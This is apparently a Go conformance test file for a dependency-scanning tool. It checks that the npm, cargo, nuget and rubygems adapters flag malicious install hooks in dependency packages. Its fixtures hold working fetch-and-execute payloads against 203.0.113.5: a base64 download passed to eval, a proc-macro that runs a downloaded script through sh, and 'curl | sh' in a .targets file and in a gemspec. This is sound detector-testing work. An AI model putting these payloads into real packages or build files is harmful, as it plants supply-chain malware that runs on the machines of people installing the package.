package conformance_test

import (
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem"
	"ihbv.io/depsnort/internal/ecosystem/cargo"
	"ihbv.io/depsnort/internal/ecosystem/composer"
	"ihbv.io/depsnort/internal/ecosystem/gomod"
	"ihbv.io/depsnort/internal/ecosystem/npm"
	"ihbv.io/depsnort/internal/ecosystem/nuget"
	"ihbv.io/depsnort/internal/ecosystem/pypi"
	"ihbv.io/depsnort/internal/ecosystem/rubygems"
	"ihbv.io/depsnort/internal/graph"
)

// Install-surface conformance, DEPENDENCY-PATH edition (D-151).
//
// TestInstallSurfaceAsymmetricPrecondition proves the asymmetric-precondition
// contract for a ROOT node. But several adapters reach a dependency through
// entirely SEPARATE dispatch from the root: npm's node_modules-keyed main loop
// (the root suite's no-npm.path node actually exercises the publishable-root
// pass instead), and cargo/nuget/rubygems' vendor- and cache-lookup functions.
// A precondition bug in that dependency dispatch — one analysis gated behind
// another's — would pass the root suite untouched. D-148 had just added new
// dependency-scan code to three of these, which is exactly when it needs a guard.
//
// Each case places the fixture where the adapter LOOKS for a dependency's
// source, marks the node a real dependency (Depth 1, non-root), removes the
// FIRST analysis's precondition, and asserts the SECOND still fires AND is
// attributed to the DEPENDENCY node. That attribution check is the anti-vacuity
// guard: a misplaced fixture produces no hook (fail), and a fixture that
// accidentally triggers the ROOT dispatch attributes its hook to the root node
// (fail), so a green result can only mean the dependency dispatch itself ran the
// second analysis without the first.

type depCase struct {
	name      string
	absent    string
	adapter   surfaceExtractor
	wantHook  string
	ecosystem string
	depName   string
	depVer    string
	files     map[string]string // written under the project dir where the adapter searches
	setenv    map[string]string // env cache paths; values are made absolute against the project dir
	npmPath   bool              // set npm.path on the nodes (npm only)
}

func depCases() []depCase {
	return []depCase{
		{
			name: "npm", absent: "lifecycle scripts", adapter: &npm.Adapter{},
			ecosystem: "npm", depName: "dep", depVer: "1.0.0",
			wantHook: "module-load:index.js", npmPath: true,
			files: map[string]string{
				"node_modules/dep/package.json": `{"name":"dep","version":"1.0.0","main":"index.js"}`,
				"node_modules/dep/index.js": `const https=require('https');
https.get('https://203.0.113.5/s',r=>{let b='';r.on('data',d=>b+=d);r.on('end',()=>eval(Buffer.from(b,'base64').toString()));});`,
			},
		},
		{
			name: "cargo", absent: "build.rs", adapter: cargo.New(),
			ecosystem: "cargo", depName: "dep", depVer: "1.0.0",
			wantHook: "proc-macro",
			files: map[string]string{
				"vendor/dep/Cargo.toml": "[package]\nname = \"dep\"\nversion = \"1.0.0\"\n\n[lib]\nproc-macro = true\n",
				"vendor/dep/src/lib.rs": `use std::process::Command;
pub fn expand() {
    let out = reqwest::blocking::get("https://203.0.113.5/x").unwrap().bytes().unwrap();
    Command::new("sh").arg("-c").arg(String::from_utf8_lossy(&out).to_string()).status().unwrap();
}`,
			},
		},
		{
			name: "nuget", absent: "PowerShell install hooks", adapter: nuget.New(),
			ecosystem: "nuget", depName: "Dep", depVer: "1.0.0",
			wantHook: "build/Dep.targets",
			files: map[string]string{
				"cache/dep/1.0.0/build/Dep.targets": `<Project><Target Name="Go" AfterTargets="Build">
<Exec Command="curl -s https://203.0.113.5/x | sh" /></Target></Project>`,
			},
			setenv: map[string]string{"NUGET_PACKAGES": "cache"},
		},
		{
			name: "rubygems", absent: "extconf.rb and Rakefile", adapter: rubygems.New(),
			ecosystem: "gem", depName: "dep", depVer: "1.0.0",
			wantHook: "gemspec:extensions",
			files: map[string]string{
				"Gemfile.lock": "GEM\n  specs:\n    dep (1.0.0)\n",
				"vendor/bundle/ruby/3.2.0/gems/dep-1.0.0/dep.gemspec": `Gem::Specification.new do |s|
  s.name = "dep"
  s.extensions = ["ext/extconf.rb"]
  system("curl -s https://203.0.113.5/x | sh")
end`,
			},
		},
	}
}

// depDispatchExempt records adapters whose dependency path is NOT a separate
// multi-analysis dispatch, with the reason each is exempt.
func depDispatchExempt() map[string]string {
	return map[string]string{
		"composer": "dependency source (vendor/<name>) funnels through one AnalyzePHP(scripts, type, plugin) call; the scripts-vs-plugin asymmetry lives inside that function and is exercised by the root suite",
		"pypi":     "dependency install-surface is a single fetched-sdist setup.py analysis, not two independent ones",
		"gomod":    "single analysis: every .go source under the module goes to AnalyzeGo in one call (same exemption as the root suite)",
	}
}

func depCaseHooks(t *testing.T, c depCase) []*graph.Node {
	t.Helper()
	dir := writeTree(t, c.files)
	for k, v := range c.setenv {
		t.Setenv(k, filepath.Join(dir, v))
	}
	g := graph.New()
	rootAttr := map[string]string{}
	depAttr := map[string]string{}
	if c.npmPath {
		rootAttr["npm.path"] = "."
		depAttr["npm.path"] = "node_modules/" + c.depName
	}
	root := g.AddNode(&graph.Node{
		ID: "pkg:" + c.ecosystem + "/proj@1.0.0", Kind: graph.KindPackage,
		Ecosystem: c.ecosystem, Name: "proj", Version: "1.0.0", Depth: 0, Attr: rootAttr,
	})
	g.MarkRoot(root.ID)
	dep := g.AddNode(&graph.Node{
		ID: "pkg:" + c.ecosystem + "/" + c.depName + "@" + c.depVer, Kind: graph.KindPackage,
		Ecosystem: c.ecosystem, Name: c.depName, Version: c.depVer, Depth: 1, Attr: depAttr,
	})
	g.AddEdge(root.ID, dep.ID, graph.EdgeDependsOn)

	if err := c.adapter.ExtractInstallSurface(dir, g); err != nil {
		t.Logf("ExtractInstallSurface reported gaps: %v", err)
	}
	var hooks []*graph.Node
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook {
			hooks = append(hooks, n)
		}
	}
	return hooks
}

// TestInstallSurfaceDependencyAsymmetry is the contract on the dependency
// dispatch: with the first analysis's precondition absent from the fixture, the
// second must still fire AND attach to the dependency node.
func TestInstallSurfaceDependencyAsymmetry(t *testing.T) {
	for _, c := range depCases() {
		t.Run(c.name, func(t *testing.T) {
			depID := "pkg:" + c.ecosystem + "/" + c.depName + "@" + c.depVer
			var names []string
			for _, h := range depCaseHooks(t, c) {
				names = append(names, h.Name)
				if h.Name == c.wantHook {
					if owner := h.Attr["hook.package"]; owner != depID {
						t.Errorf("hook %q fired but is attributed to %q, not the dependency %q — "+
							"this exercised the root dispatch, not the dependency dispatch", c.wantHook, owner, depID)
					}
					return
				}
			}
			t.Errorf("on the dependency path, with %s absent, expected %q to still fire; got %v\n"+
				"this is the D-134 shape on the dependency dispatch the root suite never reaches",
				c.absent, c.wantHook, names)
		})
	}
}

// TestEveryExtractorHasDependencyPathCoverage mirrors the root suite's coverage
// guard: every adapter is either exercised on its dependency dispatch above or
// recorded as exempt, so a newly added dependency scan cannot slip in unguarded.
func TestEveryExtractorHasDependencyPathCoverage(t *testing.T) {
	all := map[string]any{
		"npm": &npm.Adapter{}, "cargo": cargo.New(), "nuget": nuget.New(),
		"rubygems": rubygems.New(), "pypi": pypi.New(), "composer": composer.New(),
		"gomod": gomod.New(),
	}
	covered := map[string]bool{}
	for _, c := range depCases() {
		covered[c.name] = true
	}
	exempt := depDispatchExempt()
	for name, a := range all {
		if _, ok := a.(ecosystem.InstallSurfaceExtractor); !ok {
			t.Errorf("%s: no longer implements InstallSurfaceExtractor — update this suite", name)
			continue
		}
		if !covered[name] && exempt[name] == "" {
			t.Errorf("%s implements InstallSurfaceExtractor but has neither a depCases() entry nor a "+
				"depDispatchExempt() exemption — a dependency scan may be unguarded", name)
		}
		if covered[name] && exempt[name] != "" {
			t.Errorf("%s is listed as both dependency-covered and exempt", name)
		}
	}
}
